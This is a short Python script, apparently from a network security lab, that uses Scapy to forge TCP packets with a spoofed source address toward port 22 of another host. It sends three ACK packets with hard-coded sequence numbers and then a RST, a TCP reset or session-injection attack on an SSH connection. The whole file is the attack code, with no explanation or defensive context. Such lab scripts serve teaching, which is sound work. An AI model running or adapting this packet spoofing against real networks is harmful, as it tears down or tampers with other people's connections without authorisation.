#!/usr/bin/env python
from scapy.all import *
from scapy.layers.inet import IP, TCP

dport = 22
sport = 58846
srcip = "10.0.2.5"
dstip = "10.0.2.4"
ip=IP(src=srcip, dst=dstip)

TCP_ACK1=TCP(sport=sport, dport=dport, flags="A", seq=101, ack=101)
send(ip/TCP_ACK1)

TCP_ACK2=TCP(sport=sport, dport=dport, flags="A", seq=102, ack=102)
send(ip/TCP_ACK2)

TCP_ACK3=TCP(sport=sport, dport=dport, flags="A", seq=103, ack=103)
send(ip/TCP_ACK3)

TCP_ACK3=TCP(sport=sport, dport=dport, flags="R", seq=103, ack=103)
send(ip/TCP_ACK3)